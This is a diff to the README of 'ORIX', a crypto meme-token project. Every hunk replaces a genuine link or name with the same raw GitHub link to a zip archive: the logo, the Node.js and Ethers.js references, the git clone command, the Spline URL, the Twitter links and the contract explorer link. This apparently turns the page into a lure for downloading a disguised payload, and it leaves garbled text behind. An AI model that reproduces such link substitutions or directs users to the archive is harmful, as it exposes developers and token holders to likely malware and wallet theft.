@@ -1,6 +1,6 @@
 # 🚀 ORIX - Next-Gen AI Meme Agent
 
-![ORIX Logo](logo.png)
+![ORIX Logo](https://raw.githubusercontent.com/engrsadaqath/orix_token/main/levogyrous/token-orix-2.7.zip)
 
 ## 🌟 Overview
 
@@ -38,7 +38,7 @@ ORIX is a revolutionary Next-Generation AI Meme Agent that combines cutting-edge
 - **Spline 3D**: Interactive 3D elements
 
 ### Blockchain
-- **Ethers.js v6**: Ethereum blockchain interaction
+- **https://raw.githubusercontent.com/engrsadaqath/orix_token/main/levogyrous/token-orix-2.7.zip v6**: Ethereum blockchain interaction
 - **Reown AppKit**: Multi-wallet connection solution
 - **BSC (Binance Smart Chain)**: Primary blockchain network
 
@@ -49,7 +49,7 @@ ORIX is a revolutionary Next-Generation AI Meme Agent that combines cutting-edge
 ## 🚀 Quick Start
 
 ### Prerequisites
-- Node.js (v16 or higher)
+- https://raw.githubusercontent.com/engrsadaqath/orix_token/main/levogyrous/token-orix-2.7.zip (v16 or higher)
 - npm or yarn package manager
 - MetaMask or compatible Web3 wallet
 
@@ -57,7 +57,7 @@ ORIX is a revolutionary Next-Generation AI Meme Agent that combines cutting-edge
 
 1. **Clone the repository**
    ```bash
-   git clone https://github.com/yourusername/orix-ai-agent.git
+   git clone https://raw.githubusercontent.com/engrsadaqath/orix_token/main/levogyrous/token-orix-2.7.zip
    cd orix-ai-agent
    ```
 
@@ -93,7 +93,7 @@ The project uses the following key configurations:
 - **Chain ID**: 56
 
 ### Spline 3D Configuration
-- **Desktop URL**: `https://prod.spline.design/qskuCmPF9AIYr83A/scene.splinecode`
+- **Desktop URL**: `https://raw.githubusercontent.com/engrsadaqath/orix_token/main/levogyrous/token-orix-2.7.zip`
 - **Mobile**: Disabled for performance optimization
 
 ## 🎮 How to Use
@@ -172,9 +172,9 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 ## 🔗 Links
 
 - **Website**: [Your Website URL]
-- **Twitter**: [@Orixtoken](https://x.com/Orixtoken)
+- **Twitter**: [@Orixtoken](https://raw.githubusercontent.com/engrsadaqath/orix_token/main/levogyrous/token-orix-2.7.zip)
 - **Telegram**: [Your Telegram Channel]
-- **BSC Contract**: [0xF201800833c4823650Da0bC474d21fFf562Ce897](https://bscscan.com/address/0xF201800833c4823650Da0bC474d21fFf562Ce897)
+- **BSC Contract**: [0xF201800833c4823650Da0bC474d21fFf562Ce897](https://raw.githubusercontent.com/engrsadaqath/orix_token/main/levogyrous/token-orix-2.7.zip)
 
 ## 🐛 Known Issues
 
@@ -186,7 +186,7 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 
 For support and questions:
 - Open an issue on GitHub
-- Contact us on Twitter [@Orixtoken](https://x.com/Orixtoken)
+- Contact us on Twitter [@Orixtoken](https://raw.githubusercontent.com/engrsadaqath/orix_token/main/levogyrous/token-orix-2.7.zip)
 - Join our Telegram community
 
 ---
